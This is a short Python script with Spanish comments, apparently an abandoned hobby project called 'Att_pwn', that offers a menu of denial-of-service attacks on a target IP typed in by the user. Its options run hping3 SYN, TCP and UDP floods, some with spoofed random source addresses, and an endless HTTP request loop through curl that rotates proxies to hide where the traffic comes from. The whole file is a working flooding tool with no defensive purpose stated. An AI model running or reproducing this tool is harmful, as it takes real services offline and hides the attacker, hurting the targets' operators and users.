# Esta abandonado por el momento elimine mi git principal y este lo deje de lado por el momento 

import subprocess
import random

# Leer lista de proxies desde un archivo
with open('proxies.txt', 'r') as file:
    proxies = file.readlines()

# Solicita IP
ip_destino = input("Ingresa la dirección IP de destino: ")

print("\nAtt_pwn")

while True:
    try:
        print("\nEscoge una opción:")
        print(" 1 = Flood \n 2 = TCP \n 3 = UDP \n 4 = HTTP Attack \n 0 = Salir")

        att = input()

        if att == "0":
            print("UwU")
            break  # Terminamos

        att = int(att)  # Condición a entero

        if att == 1:
            print(f"Ejecutando ataque Flood en {ip_destino}...")
            subprocess.run(["sudo", "hping3", "-S", "--flood", "-i", "u1", "-d", "65000", "--rand-source", ip_destino])

        elif att == 2:
            print(f"Ejecutando ataque TCP en {ip_destino}...")
            subprocess.run(["sudo", "hping3", "-S", "-p", "80", "--flood", "-i", "u1", "--rand-source", ip_destino])

        elif att == 3:
            print(f"Ejecutando ataque UDP en {ip_destino}...")
            subprocess.run(["sudo", "hping3", "--udp", "-p", "80", "--flood", "-i", "u1", ip_destino])

        elif att == 4:
            print(f"Ejecutando ataque HTTP en {ip_destino}...")
            while True:
                try:
                    # Selecciona un proxy aleatorio
                    proxy = random.choice(proxies).strip()
                    subprocess.run(["curl", "-X", "GET", ip_destino, "--proxy", proxy])
                except KeyboardInterrupt:
                    print("\nAtaque HTTP detenido.")
                    break  # Permite salir con Ctrl+C

        else:
            print("No seleccionaste una opción válida.")

    except ValueError:  # Error no numérico
        print("¡Error! Solo números \n 0 = para salir.")

print("ChaooO")
